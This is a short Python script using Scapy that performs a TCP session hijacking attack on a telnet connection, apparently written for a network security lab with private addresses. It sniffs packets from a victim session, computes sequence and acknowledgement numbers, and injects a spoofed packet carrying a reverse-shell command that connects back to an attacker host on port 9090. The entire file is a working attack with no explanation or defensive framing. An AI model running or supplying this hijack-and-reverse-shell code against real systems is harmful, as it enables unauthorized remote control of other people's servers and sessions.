#!/usr/bin/python3
import sys
from scapy.all import *


recv=sniff(filter="tcp and host 10.8.8.2",lfilter = lambda x:x[TCP].flags=='PA' and x[TCP].sport == 23,count=3) 
l=len(recv[2][Raw]) 
a=recv[2][TCP].seq+l 
ip = IP(src="10.8.8.2", dst="10.5.5.10") 
tcp = TCP(sport=recv[2][TCP].dport, dport=23, flags="PA",seq=recv[2][TCP].ack, ack=a) 
Data = "\r /bin/bash -i > /dev/tcp/10.5.5.3/9090 2>&1 0<&1\r" 
pkt = ip/tcp/Data 
a=send(pkt) 
